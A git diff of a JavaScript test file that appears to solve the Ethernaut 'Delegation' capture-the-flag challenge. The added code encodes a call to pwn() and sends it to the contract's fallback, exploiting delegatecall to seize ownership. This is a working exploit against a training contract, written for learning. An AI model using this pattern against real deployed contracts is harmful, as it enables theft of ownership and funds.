@@ -14,22 +14,26 @@ before(async () => {
     [eoa] = accounts;
     const challengeFactory = await ethers.getContractFactory(`Delegation`);
     const challengeAddress = await createChallenge(
-        `0x9451961b7Aea1Df57bc20CC68D72f662241b5493`
+        `0xF781b45d11A37c51aabBa1197B61e6397aDf1f78`
     );
     challenge = await challengeFactory.attach(challengeAddress);
 });
 
 it("solves the challenge", async function () {
-    const delegateeAbi = ["function pwn()"];
-    let iface = new ethers.utils.Interface(delegateeAbi);
-    const data = iface.encodeFunctionData(`pwn`, []);
-
-    tx = await eoa.sendTransaction({});
-
-    // tx = await challenge.fallback({
-    //   data,
-    // })
-    await tx.wait();
+    let owner = await challenge.callStatic.owner();
+    console.log("origin owner: " + owner);
+    // 注意先构造出函数的 call-function-data
+    const abi = ["function pwn() public"];
+    const pwnInterface = new ethers.utils.Interface(abi);
+    const callData = pwnInterface.encodeFunctionData("pwn", []);
+    let tx = {
+        to: challenge.address,
+        data: callData,
+        gasPrice: ethers.utils.parseUnits("3", "gwei"),
+        gasLimit: 2100000,
+    };
+    const rep = await eoa.sendTransaction(tx);
+    await rep.wait();
 });
 
 after(async () => {
